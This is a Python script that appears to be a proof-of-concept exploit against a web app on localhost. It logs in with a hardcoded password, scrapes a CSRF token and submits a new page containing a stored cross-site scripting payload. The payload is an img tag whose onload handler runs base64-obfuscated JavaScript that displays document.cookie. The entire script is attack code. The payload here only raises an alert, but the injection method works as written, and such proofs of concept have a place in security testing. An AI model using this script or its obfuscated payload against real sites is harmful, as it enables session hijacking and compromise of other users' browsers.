import requests

s = requests.Session()

login_data = {
  'username': 'Test',
  'password': 'hdxGm6EgD9JvmmFNxT4x',
}

s.post('http://127.0.0.1:8080/login.php', data=login_data)

new_page_text = s.get('http://127.0.0.1:8080/new_page.php').text

csrf_token = new_page_text.split('"csrf_token" value="')[1].split('"')[0]
print("Got csrf_token: " + csrf_token)

eploit = '''
<img
  src="https://image.shutterstock.com/image-vector/example-signlabel-features-speech-bubble-260nw-1223219848.jpg"
  onload="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))"
>
'''

page_data = {
  'name': 'eploit_test',
  'content': eploit,
  'csrf_token': csrf_token,
}

response = s.post('http://127.0.0.1:8080/new_page.php', data=page_data)
print("Response: " + response.text.split('<div class="panel-heading">')[1].split('</div>')[0].strip())